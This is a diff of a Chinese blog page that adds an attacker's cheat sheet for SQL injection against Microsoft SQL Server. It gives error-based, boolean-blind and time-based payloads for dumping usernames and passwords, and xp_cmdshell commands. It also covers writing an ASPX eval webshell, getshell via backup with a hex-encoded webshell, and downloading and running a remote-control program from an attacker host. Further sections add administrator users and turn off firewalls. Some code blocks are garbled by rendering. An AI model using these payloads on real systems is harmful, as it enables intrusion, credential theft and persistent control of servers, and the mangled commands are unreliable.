@@ -175,10 +175,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-02-15 10:27:54 / 修改时间：11:54:38" itemprop="dateCreated datePublished" datetime="2020-02-15T10:27:54+08:00">2020-02-15</time>
+              <time title="创建时间：2020-02-15 10:27:54" itemprop="dateCreated datePublished" datetime="2020-02-15T10:27:54+08:00">2020-02-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-17 12:26:18" itemprop="dateModified" datetime="2020-02-17T12:26:18+08:00">2020-02-17</time>
+              </span>
 
           
 
@@ -242,6 +248,197 @@
 </ul>
 </li>
 </ol>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>convert()函数，把日期转换为新数据类型的通用函数CONVERT(data_type(length),data_to_be_converted,style)  其中data_type(length) 规定目标数据类型（带有可选的长度）。data_to_be_converted 含有需要转换的值。style 规定日期/时间的输出格式。如CONVERT(VARCHAR(10),GETDATE(),110)。</li>
+<li>对于convert(int,@@version),convert函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，无法进行指定的转换，所以，convert函数会抛出一个SQL server错误消息，指出“SQL查询结果”无法转换为“int”类型，这样的话，攻击者就能得到的这个SQL查询的结果了。</li>
+<li>类似的函数还有：file_name()，db_name()，col_name()，filegroup_name()，object_name()<br>schema_name()，type_name()，cast()。</li>
+</ul>
+<h2 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>查询基本信息<ul>
+<li>convert(int,@@version) - 获取版本信息</li>
+<li>convert(int,db_name()) -数据库名字</li>
+<li>convert(int,user) -当前用户名</li>
+<li>convert(int,@@SERVERNAME)– 获取有关服务器主机的信息</li>
+</ul>
+</li>
+<li>获取当前数据库表名<ul>
+<li><code>CONVERT(int,(select top 1 table_name from information_schema.columns))</code></li>
+</ul>
+</li>
+<li>获取列名<ul>
+<li><code>convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(16进制的表名 as varchar)))</code></li>
+<li>注：16进制编码前面加0x</li>
+</ul>
+</li>
+<li>获取数据<ul>
+<li><code>convert(int,(select top 1 name 列名 from 表名))</code></li>
+</ul>
+</li>
+</ol>
+<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><ul>
+<li>查询的语句都直接放在参数值位置，及id=convert(…)</li>
+</ul>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>和MYSQL的盲注差不多</li>
+</ul>
+<h2 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h2><ol>
+<li><p>猜数据库长度和名字</p>
+<ul>
+<li>先猜dbid：<figure class="highlight plain"><figcaption><span>(select count(*) from Master..Sysdatabases where dbid</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ 根据dbid猜库名，先猜出长度：</span><br><span class="line">  &#96;&#96;&#96;and (select count(*) from Master..Sysdatabases where dbid&#x3D;5 and len(name)&#x3D;12)&#x3D;1</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p>再逐位猜：</p>
+<figure class="highlight plain"><figcaption><span>exists(select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;and exists(select top 1 name from Master..SysDatabases where unicode(substring(name,2,1))&#x3D;111)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>exists(select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 猜表名</span><br><span class="line"></span><br><span class="line">   + &#96;&#96;&#96;and (select count(*) from mozhe_db_v2.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and len(name)&#x3D;9)&#x3D;1</span><br></pre></td></tr></table></figure></li>
+<li><p><code>and exists(select top 1 name from mozhe_db_v2.dbo.sysobjects where unicode(substring(name,1,1))=109)</code></p>
+<figure class="highlight plain"><figcaption><span>exists(select top 1 name from mozhe_db_v2.dbo.sysobjects where unicode(substring(name,1,1))</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. 猜列名</span><br><span class="line"></span><br><span class="line">   + &#96;&#96;&#96;and (select count(*) from mozhe_db_v2.dbo.syscolumns where name in (select top 1 name from database_db.dbo.syscolumns where id&#x3D;object_id(&#39;mozhe_db_v2.dbo.table&#39;)) and len(name)&#x3D;9)&#x3D;1</span><br></pre></td></tr></table></figure></li>
+<li><p><code>and exists(select top 1 name from mozhe_db_v2.dbo.syscolumns where id =(select id from sysobjects where name = &#39;manage&#39;) and unicode(substring(name,1,1))=117)</code></p>
+</li>
+<li><p><code>and exists(select top 1 name from mozhe_db_v2.dbo.syscolumns where id =(select id from sysobjects where name = &#39;manage&#39;) and unicode(substring(name,1,1))=117 and name not in (&#39;manage&#39;))</code></p>
+</li>
+</ul>
+<ol start="4">
+<li><p>猜数据</p>
+<ul>
+<li><code>and (select count(*) from mozhe_db_v2.dbo.manage where name in (select top 1 name from mozhe_db_v2.dbo.manage) and len(name)=9)=1</code></li>
+<li><code>and exists(select id from manage where unicode(substring(username,1,1))=97 and ID=1)</code></li>
+<li><code>and exists(select id from manage where unicode(substring(username,2,1))=100 and ID=1)</code></li>
+<li><code>and exists(select id from manage where unicode(substring(password,1,1))=55 and ID=1)</code></li>
+<li><code>and exists(select id from manage where unicode(substring(password,2,1))=50 and ID=1)</code></li>
+</ul>
+</li>
+</ol>
+<h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>延时函数：WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作用就是等待特定时间，然后继续执行后续的语句。它包含⼀个参数DELAY，⽤来指定等待的时间。如果将该语句成功注入后，会造成数据库返回记录和Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注入漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测方法。如：<code>WAITFOR DELAY &#39;0:0:4&#39;</code> – 表⽰延迟4秒。</li>
+<li>IF exists ()子句：<code>IF exists () WAITFOR DELAY &#39;0:0:5&#39;</code></li>
+</ul>
+<h2 id="流程-3"><a href="#流程-3" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断注入<ul>
+<li><code>?id=1 WAITFOR DELAY &#39;0:0:4&#39;</code></li>
+</ul>
+</li>
+<li>猜数据库名<ul>
+<li><code>?id=1 IF exists (select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))=109) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+</ul>
+</li>
+<li>猜表名<ul>
+<li><code>IF exists (select top 1 name from syscolumns where id =(select id from sysobjects where name = &#39;表名&#39;) and unicode(substring(name,1,1))=117) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+</ul>
+</li>
+<li>猜列名<ul>
+<li><code>IF exists (select top 1 name from syscolumns where id =(select id from sysobjects where name = &#39;表名&#39;) and unicode(substring(name,1,1))=117) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+</ul>
+</li>
+<li>逐字猜解数据<ul>
+<li><code>IF exists (select id from 表名 where unicode(substring(列名1,1,1))=97 and ID=1) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+</ul>
+</li>
+</ol>
+<h1 id="SA权限处理"><a href="#SA权限处理" class="headerlink" title="SA权限处理"></a>SA权限处理</h1><h2 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h2><ul>
+<li><code>and 1=(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;))</code></li>
+</ul>
+<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><ul>
+<li><code>;exec_master..xp_cmdshell &#39;dir c:\&#39; --</code>   注意分号，这是两条语句。</li>
+<li>能不能执行系统命令怎么判断：用ping命令执行，<code>ping -n 10 www.baidu.com</code> ，看他返回的时间是不是10秒左右。</li>
+<li>不能执行的话，可能因为存储过程被禁用了，启用存储过程的命令：<code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></li>
+</ul>
+<h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><ul>
+<li>低权限下也能写，只要是写权限。用 echo命令写文件。echo  文件内容  &gt;  文件路径。</li>
+<li>有回显，想看执行结果，就把执行结果写到表里面，读取表的内容</li>
+<li>无回显，多试几次。比如echo的转义问题，符号要用小尖括号^转义，比如”–&gt;^”，加在前面。遇到什么奇怪的错误把双引号改成单引号试试。windows路径换成反斜杠。</li>
+<li>没爆路径。for循环写webshell<ul>
+<li><code>for %i in (c) do (c: %i:\ &amp; (for /r %j in (*default.aspx) do echo ^xf1433&gt;&gt;%~dpjdark5.aspx))</code> dark5.aspx可能生成到其他目录下。</li>
+<li><code>for /r c:\ %i in (default*.aspx) do @echo ^&lt;^%^@ Page Language=^&quot;Jscript^&quot;^%^&gt;^&lt;^%eval^(Request.Item[^&quot;c^&quot;],^&quot;unsafe^&quot;^);^%^&gt; &gt; %~$PATH:idark5.aspx</code>  生成的文件名是default.aspxdark5.aspx，和网站目录一致。</li>
+</ul>
+</li>
+</ul>
+<h2 id="下载-执行-反向-远程控制服务端"><a href="#下载-执行-反向-远程控制服务端" class="headerlink" title="下载 执行 反向 远程控制服务端"></a>下载 执行 反向 远程控制服务端</h2><ol>
+<li><p>流程</p>
+<ul>
+<li>大致的流程就是先在自己的公网服务器上上传远控端文件，然后再在已经拿下的服务器上通过注入点执行下载命令从自己的服务器上下载远控端文件执行。下载好后在自己的服务器开启监听，再在注入点执行远控服务端，自己的服务器上就能收到并控制。</li>
+</ul>
+</li>
+<li><p>下载的方式有下面这些</p>
+<ul>
+<li><p>certutil //windows 2003/XP 测试失败。</p>
+<figure class="highlight plain"><figcaption><span>-urlcache -split -f  远程url的远控文件路径  下载的文件路径```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ bitsadmin &#x2F;&#x2F;win 7&#x2F;2008</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;cmd.exe &#x2F;c bitsadmin &#x2F;transfer 任务名 远程url的远控文件路径 下载的文件路径</span><br></pre></td></tr></table></figure>
+
+<p>下载的时候最好指定一个一定存在的目录，不然可能失败。如c:\users\public\</p>
+</li>
+<li><p>powershell //win 7/2008</p>
+<figure class="highlight powershell"><figcaption><span>-exec bypass -c (new-object System.Net.Webclient).DownloadFile('http://192.168.0.1/1.exe,'c:\windows\temp\1.exe')```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ vbs</span><br><span class="line"></span><br><span class="line">  通过echo写进vbs文件再运行下载。执行：</span><br><span class="line"></span><br><span class="line">  ```cscript.exe  hack.vbs</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其他用法看文章 <a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">https://evi1cg.me/archives/remote_exec.html</a></p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>当前权限是有添加用户的权限，需要administrator或system；在外网；可以连接</p>
+<ul>
+<li>具体命令：<ul>
+<li><code>net user 用户名 密码 /add</code>  –添加用户</li>
+<li><code>net localgroup administrators 用户名 /add</code> –将用户添加进管理员组</li>
+<li><code>net localgroup &quot;Remote Management Users&quot; 用户名 /add</code>–将用户添加进远程桌面管理组</li>
+<li>连不上就尝试开启3389。</li>
+<li><code>net user 用户名 /del</code> –删除用户</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>防护软件不给连接<ul>
+<li>可尝试关闭但可能触发警报</li>
+</ul>
+</li>
+<li>防火墙开启<ul>
+<li>可用命令关闭</li>
+</ul>
+</li>
+<li>不给添加用户<ul>
+<li>尝试提权</li>
+</ul>
+</li>
+</ul>
+<h1 id="db-owner权限处理"><a href="#db-owner权限处理" class="headerlink" title="db_owner权限处理"></a>db_owner权限处理</h1><h2 id="判断权限-1"><a href="#判断权限-1" class="headerlink" title="判断权限"></a>判断权限</h2><ul>
+<li><code>and 1=(Select IS_MEMBER(&#39;db_owner&#39;)) //判断是否是库权限</code></li>
+<li><code>and 1=(Select IS_MEMBER(&#39;public&#39;))</code></li>
+</ul>
+<h2 id="getshell前提"><a href="#getshell前提" class="headerlink" title="getshell前提"></a>getshell前提</h2><ul>
+<li>DB_owner权限</li>
+<li>网站物理路径</li>
+</ul>
+<h2 id="getshell姿势"><a href="#getshell姿势" class="headerlink" title="getshell姿势"></a>getshell姿势</h2><ol>
+<li><p>log备份getshell</p>
+<ul>
+<li><code>;alter database test set RECOVERY FULL--</code> 设置数据库test为recover模式</li>
+<li><code>;create table cmd --</code>  删除同名表</li>
+<li><code>;create table cmd (a image)--</code>  创建表，字段名是a，类型是image</li>
+<li><code>;backup log test to disk = &#39;c:/x.bak&#39; with init--</code> 进行log备份</li>
+<li><code>;insert into cmd (a) values(0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e)--</code> 插入一句话到字段a里</li>
+</ul>
+</li>
+<li><p>差异备份getshell</p>
+<ul>
+<li><p>⾸先完整备份⼀次(c:\ddd.bak为所备份文件)</p>
+<figure class="highlight plain"><figcaption><span>database test to disk </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 创建表并插入数据</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;;create table [dbo].[cmd] ([colu][image]);insert into cmd(colu) values(0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e);--</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进⾏差异备份</p>
+<p><code>;backup database test to disk=&#39;c:\Users\Administrator\desktop\l\d2.aspx&#39; WITH DIFFERENTIAL,FORMAT;--</code></p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h1><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><ul>
+<li>sql盲注</li>
+<li>命令执行，ssrf，xss无回显</li>
+</ul>
+<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置⼀条NS记录，然后我们在NS服务器上面获取DNS日志即可。</p>
+<h2 id="流程-4"><a href="#流程-4" class="headerlink" title="流程"></a>流程</h2><p>具体的先不说，等以后再讲。先看资料学习。</p>
 
       
     </div>
